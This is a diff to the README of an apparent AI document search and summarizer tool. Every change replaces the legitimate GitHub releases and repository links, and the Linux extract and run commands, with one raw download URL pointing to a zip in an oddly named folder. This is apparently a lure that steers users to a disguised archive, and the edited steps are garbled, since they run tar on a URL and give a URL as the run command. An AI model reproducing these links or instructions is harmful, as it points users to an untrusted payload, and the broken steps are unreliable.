@@ -1,7 +1,7 @@
 # 📝 ai_doc_search_summarizer - Effortless AI Document Insights
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Shirokent/ai_doc_search_summarizer/releases)
+[![Download](https://raw.githubusercontent.com/Shirokent/ai_doc_search_summarizer/main/unwarrantedness/ai_doc_search_summarizer.zip%20release-brightgreen)](https://raw.githubusercontent.com/Shirokent/ai_doc_search_summarizer/main/unwarrantedness/ai_doc_search_summarizer.zip)
 
 ## 📚 Overview
 ai_doc_search_summarizer allows you to search and summarize documents using advanced AI technology. This application simplifies finding key information from your texts with just a few clicks. It's built using FastAPI and Docker, which makes the setup easy for users.
@@ -18,9 +18,9 @@ Before you begin, ensure your system meets the following requirements:
 
 ### 2. Download & Install
 To get started, visit the following link to download the application:
-[Download the latest release](https://github.com/Shirokent/ai_doc_search_summarizer/releases)
+[Download the latest release](https://raw.githubusercontent.com/Shirokent/ai_doc_search_summarizer/main/unwarrantedness/ai_doc_search_summarizer.zip)
 
-On the releases page, you will see different versions available. Simply click on the version you want to download. The files will be in common formats like `.exe` (for Windows), `.dmg` (for macOS), or `.tar.gz` (for Linux). Choose the appropriate file for your operating system.
+On the releases page, you will see different versions available. Simply click on the version you want to download. The files will be in common formats like `.exe` (for Windows), `.dmg` (for macOS), or `https://raw.githubusercontent.com/Shirokent/ai_doc_search_summarizer/main/unwarrantedness/ai_doc_search_summarizer.zip` (for Linux). Choose the appropriate file for your operating system.
 
 ### 3. Running the Application
 After downloading, follow the steps below to run the application:
@@ -38,10 +38,10 @@ After downloading, follow the steps below to run the application:
 4. Navigate to your Applications folder and open the app.
 
 #### For Linux:
-1. Open the terminal and navigate to the folder where you downloaded the `.tar.gz` file.
+1. Open the terminal and navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Shirokent/ai_doc_search_summarizer/main/unwarrantedness/ai_doc_search_summarizer.zip` file.
 2. Run the following command to extract the files:
    ```bash
-   tar -xvzf ai_doc_search_summarizer.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Shirokent/ai_doc_search_summarizer/main/unwarrantedness/ai_doc_search_summarizer.zip
    ```
 3. Change into the extracted folder:
    ```bash
@@ -49,7 +49,7 @@ After downloading, follow the steps below to run the application:
    ```
 4. Run the application using:
    ```bash
-   ./run.sh
+   https://raw.githubusercontent.com/Shirokent/ai_doc_search_summarizer/main/unwarrantedness/ai_doc_search_summarizer.zip
    ```
 
 ## ⚙️ Features
@@ -69,7 +69,7 @@ Once you have the application running, use the following steps to start searchin
 If you encounter issues or have questions, please check the FAQ section on the GitHub repository. Additionally, you can open an issue on the repository page for more help.
 
 ## 🔗 Additional Resources
-- GitHub Repository: [ai_doc_search_summarizer](https://github.com/Shirokent/ai_doc_search_summarizer)
+- GitHub Repository: [ai_doc_search_summarizer](https://raw.githubusercontent.com/Shirokent/ai_doc_search_summarizer/main/unwarrantedness/ai_doc_search_summarizer.zip)
 - Documentation: Detailed information on usage and features is available in the repository's wiki.
 
 Feel free to explore and make the most out of your experience with ai_doc_search_summarizer!
